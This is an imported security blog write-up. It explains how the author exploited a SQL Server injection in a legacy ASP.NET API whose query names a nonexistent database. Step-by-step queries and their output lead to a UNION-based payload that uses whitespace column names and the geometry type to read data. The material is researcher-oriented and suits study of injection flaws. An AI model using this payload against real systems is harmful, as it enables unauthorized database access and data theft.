---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-08-04_no-database-no-table-how-do-you-do-mssql-injection.md
original_filename: 2024-08-04_no-database-no-table-how-do-you-do-mssql-injection.md
title: No Database No Table, how do you do MSSQL Injection?
category: documents
detected_topics:
- sqli
- command-injection
- api-security
tags:
- imported
- documents
- sqli
- command-injection
- api-security
language: en
raw_sha256: 69f07c249e6a807a7de5ed6b0599d0c849de71ac7a88db3e53c85541f8249edd
text_sha256: cdf30b666711e49e2e5e0287c028408f2dbe334b05b1d94458a22f912268ada2
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# No Database No Table, how do you do MSSQL Injection?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-08-04_no-database-no-table-how-do-you-do-mssql-injection.md
- Source Type: markdown
- Detected Topics: sqli, command-injection, api-security
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `69f07c249e6a807a7de5ed6b0599d0c849de71ac7a88db3e53c85541f8249edd`
- Text SHA256: `cdf30b666711e49e2e5e0287c028408f2dbe334b05b1d94458a22f912268ada2`


## Content

---
title: "No Database No Table, how do you do MSSQL Injection?"
url: "https://cyku.tw/no-database-mssql-injection/"
final_url: "https://cyku.tw/no-database-mssql-injection/"
authors: ["Cyku (@cyku_tw)"]
bugs: ["SQL injection"]
publication_date: "2024-08-04"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 108
---

One day, while reviewing the code of an ASP.NET website, I came across a special case of SQL Injection with Microsoft SQL Server, basically the form of SQL Injection is like this:
  
  
  string sql = string.Format(
  "SELECT ReportsDB..{0}.* " +
  "FROM ReportsDB..{0} " + 
  "WHERE ReportsDB..{0}.Id = 1 "
  , Request["table"]);
  // ReportsDB doesn't exist

The first time I saw it, I thought it was just a simple SQL Injection that I could exploit as usual, I could be wrong. This code was found in a legacy API, there's actually no database called "ReportsDB" in that MSSQL server. If we try to inject stacked query, MSSQL will just respond error and won't execute the second query, because "ReportsDB" dosen't exist.
  
  
  1> select ReportsDB..foobar; waitfor delay '00:00:03'; -- .*
  2> go
  Msg 4104, Level 16, State 1, Server 38edaa74cb29, Line 1
  The multi-part identifier "ReportsDB..foobar" could not be bound.

Then I tried to use subquery to create a table called "ReportsDB" but got error again.
  
  
  1> select ReportsDB..foobar from (select 1 as foobar) as ReportsDB;
  2> go
  Msg 207, Level 16, State 1, Server 38edaa74cb29, Line 1
  Invalid column name ''.

"Invalid column name" is an interesting result, it means that MSSQL considers "ReportsDB..foobar" to be `<table_name>.<column_name>.<something>` instead of `<database_name>.<schema_name>.<column_name>`. The database_name is ReportsDB and column_name is an empty string now, the next question which I was thinking is that "Can I define a column_name with empty string using AS statement?". The answer is NO.
  
  
  1> select ReportsDB..foobar from (select 1 as '') as ReportsDB;
  2> go
  Msg 1038, Level 15, State 4, Server 38edaa74cb29, Line 1
  An object or column name is missing or empty. For SELECT INTO statements, verify each column has a name. For other statements, look for empty alias names. Aliases defined as "" or [] are not allowed. Change the alias to a valid name.
  
  1> select ReportsDB..foobar from (select 1 as []) as ReportsDB;
  2> go
  Msg 1038, Level 15, State 4, Server 38edaa74cb29, Line 1
  An object or column name is missing or empty. For SELECT INTO statements, verify each column has a name. For other statements, look for empty alias names. Aliases defined as "" or [] are not allowed. Change the alias to a valid name.

I also tried to create a column called ".foobar", which is a valid column name, but MSSQL never considers that the second dot of "ReportsDB..foobar" is the part of the column name.
  
  
  1> select ReportsDB..foobar from (select 1 as [.foobar]) as ReportsDB;
  2> go
  Msg 207, Level 16, State 1, Server 38edaa74cb29, Line 1
  Invalid column name ''.

It seems to end, but it can't be, can it?

**Space Trimming to the Rescue**

In MSSQL, trailing whitespace is valid when defining column names, and it does work if the statement of SELECT uses a column name that contains trailing whitespace.
  
  
  1> select [ReportsDB].[a ] from (select 1 as [a ]) as ReportsDB;
  2> go
  a
  -----------
  1
  
  (1 rows affected)

But what if without whitespace in the first SELECT? It still works ..
  
  
  1> select [ReportsDB].[a] from (select 1 as [a ]) as ReportsDB;
  2> go
  a
  -----------
  1
  
  (1 rows affected)

Even more whitespaces.
  
  
  1> select [ReportsDB].[a  ] from (select 1 as [a ]) as ReportsDB;
  2> go
  a
  -----------
  1
  
  (1 rows affected)
  
  1> select [ReportsDB].[a  ] from (select 1 as [a]) as ReportsDB;
  2> go
  a
  -----------
  1
  
  (1 rows affected)

Apparently, MSSQL does some kind of trimming for whitespace when processing column names. So what if you just use a single whitespace as the column name? The answer is "It still works".
  
  
  1> select [ReportsDB].[ ] from (select 1 as [ ]) as ReportsDB;
  2> go
  
  -----------
  1
  
  (1 rows affected)

MSSQL obviously does not allow you to use empty string in the `[]` expression in the SELECT statement. But wait a minute, do you remember what the SQL for the injection point looked like? 

Well..
  
  
  1> select ReportsDB..foobar from (select 1 as [ ]) as ReportsDB;
  2> go
  Msg 258, Level 15, State 1, Server 38edaa74cb29, Line 1
  Cannot call methods on int.

IT WORKS.. 

MSSQL accepts empty string as column name with `..` syntax. What's happening is that MSSQL considers `ReportsDB.` (empty string as column name) to be a valid field, `1` to be the value of this field, and `int` to be the date type of the field. It tried to look for a property named `foobar` under int data type but coudn't find it. The column name in the first SELECT is defined as an empty string, the column name in the subquery is defined as a whitespace, and MSSQL does some kind of whitespace trimming to assume that the two column names are the same, so it ends up working.

How do we define the property of a data type in SELECT?

In fact, we don't need to do this at all, why not just use existing objects in MSSQL? So I randomly chose a data type called `geometry` which has a lots of properies such as `STY`. In short, I constructed a SQL like the one below, and it worked perfectly!
  
  
  1> select ReportsDB..STY from (select geometry::STGeomFromText('POINT(0 0)',0) as [ ]) as ReportsDB;
  2> go
  
  ------------------------
  0.0
  
  (1 rows affected)

Finally, I managed to exploit this SQL Injection with a payload similar to the one below. What's even better is that it's UNION based.
  
  
  ?table=STY as id, @@version as data from (select geometry::STGeomFromText('POINT(0 0)',0) as [ ]) as ReportsDB --  

That's the short story I came across. MSSQL's T-SQL is very powerful, and there are probably more simple ways to exploit it, so it's always worth a try.

Share [ __](https://twitter.com/share?text=No Database No Table, how do you do MSSQL Injection?&url=https://cyku.tw/no-database-mssql-injection/ "Twitter") [ __](https://www.facebook.com/sharer/sharer.php?u=https://cyku.tw/no-database-mssql-injection/ "Facebook") [ __](https://www.linkedin.com/shareArticle?mini=true&url=https://cyku.tw/no-database-mssql-injection//&title=No Database No Table, how do you do MSSQL Injection? "LinkedIn") [ __](mailto:?subject=No Database No Table, how do you do MSSQL Injection?&body=https://cyku.tw/no-database-mssql-injection/ "Email")

Show Comments

[ __從寫個 WebShell 發現，啊！原來我不會寫 C# 當你在一個網站上找到可以上傳任意檔案的漏洞時，下一步會上傳什麼呢？想必大家跟我一樣，總之就想傳一個 WebShell，以 PHP 來說，可能會是 <?php system(… 07 Nov 2025 ](/xie-ge-webshell/) [ __HITCON 2023 x DEVCORE Wargame: My todolist Write-up 為了 HITCON 2023 活動，我今年也在企業攤位上準備了三題趣味性質的 Wargame 題目讓參賽者在聽完議程的空閒之餘可以享受一下親自動手解題的快樂，而除了我所準備的題目以外，包括其他所有題目都可以在以下的 GitHub repository 裡找到：… 18 Sep 2023 ](/hitcon-2023-devocre-wargame-mytodolist/)
